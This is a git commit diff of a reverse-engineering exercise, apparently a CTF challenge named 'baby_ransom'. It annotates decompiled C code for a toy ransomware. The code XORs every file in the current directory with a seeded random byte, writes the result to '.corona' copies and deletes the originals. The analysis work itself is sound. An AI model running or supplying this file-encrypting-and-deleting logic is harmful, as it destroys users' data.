890ac9953104a76ec1c3997ce286a7947a34bcbd
Kristian Nymann Jakobsen <kristian@nymann.dev>
2022-04-15 12:32:19 +0200

    :construction: 1

--- baby_ransom/reversed.c
+++ baby_ransom/reversed.c
@@ -7,21 +7,23 @@
 // Checks if the filetype of the filename is a file.
 bool is_file(char* filename);
 
-void FUN_00100c30(char* filename, ulong* param_2) {
+void set_corresponding_encrypted_filename(char* filename, ulong* param_2) {
   char cVar1;
   ulong uVar2 = 0xffffffffffffffff;
   ulong *puVar3 = param_2;
   int bVar4 = 0;
-  //*(undefined2 *)param_2 = 0x2f2e;
-  //*(undefined *)((long)param_2 + 2) = 0;
-  strcat((char *)param_2, filename);
+  *(long *) param_2 = 0x2f2e; // store 0x2f2e ("/.") at the address pointed to by param_2
+  *(long *)((long)param_2 + 2) = 0; // store 0 ("\0") NUL byte at the address of param_2 + 2.
+
+  strcat((char *)param_2, filename); // param_2 += filename
   do {
     if (uVar2 == 0) break;
-    uVar2 = uVar2 - 1;
+    uVar2--;
     cVar1 = *(char *)puVar3;
     puVar3 = (ulong *)((long)puVar3 + (ulong)bVar4 * -2 + 1);
   } while (cVar1 != '\0'); // while not NUL (end of line)
-  //*(undefined8 *)((long)param_2 + (~uVar2 - 1)) = 0x616e6f726f632e;
+
+  *(long *)((long)param_2 + (~uVar2 - 1)) = 0x616e6f726f632e;
   return;
 }
 
@@ -32,18 +34,18 @@ int _IO_getc(_IO_FILE * __fp);
 int main(int argc,char **argv)
 
 {
-  int iVar1 = rand();
   int temp_var;
-  int iVar3;
+  int end_of_file_indicator_set;
   size_t arg_zero_length;
   DIR *working_directory;
   FILE *original_file_stream;
   FILE *encrypted_file_stream;
   struct dirent *current_file;
   long in_FS_OFFSET;
-  ulong local_88 = 0x20;
+  ulong encrypted_filename_addr = 0x20;
   char program_name [56];
-  srand(0xdeadbeef);
+  srand(0xdeadbeef);  // set the random seed
+  int seeded_random_value = rand();
   arg_zero_length = strlen(*argv);
   strncpy(program_name,*argv + 2,arg_zero_length); // copy value of arg0 minus './' to local_48
   working_directory = opendir(".");
@@ -56,20 +58,22 @@ int main(int argc,char **argv)
         // If the name of the current_file didn't match the program name
         // and if the file type of the current_file is a file... then.
         original_file_stream = fopen(current_file->d_name,"rb");
-        FUN_00100c30(current_file->d_name,&local_88);
-        encrypted_file_stream = fopen((char *)&local_88,"w");
+        set_corresponding_encrypted_filename(current_file->d_name,&encrypted_filename_addr);
+        encrypted_file_stream = fopen((char *)&encrypted_filename_addr,"w");
         while (temp_var = feof(original_file_stream), temp_var == 0) {
-          temp_var = _IO_getc(original_file_stream);
-          iVar3 = feof(original_file_stream);
-          if (iVar3 == 0) {
-            fputc((int)(char)((int)temp_var ^ (int)(iVar1 % 0xff)),encrypted_file_stream);
+          temp_var = _IO_getc(original_file_stream); // fetch next char (as int) from stream
+          end_of_file_indicator_set = feof(original_file_stream);
+          if (end_of_file_indicator_set == 0) {
+            // end-of-file indicator is not set.
+            // write character to stream.
+            fputc((int)(char)((int)temp_var ^ (int)(seeded_random_value % 0xff)), encrypted_file_stream);
           }
         }
         fclose(original_file_stream); // close the handle to the file stream
         remove(current_file->d_name); // remove the original file
         fclose(encrypted_file_stream); // close the handle to the file stream
       }
-      local_88 = local_88 & 0xffffffffffffff00;
+      encrypted_filename_addr = encrypted_filename_addr & 0xffffffffffffff00;
     }
     closedir(working_directory);
   }
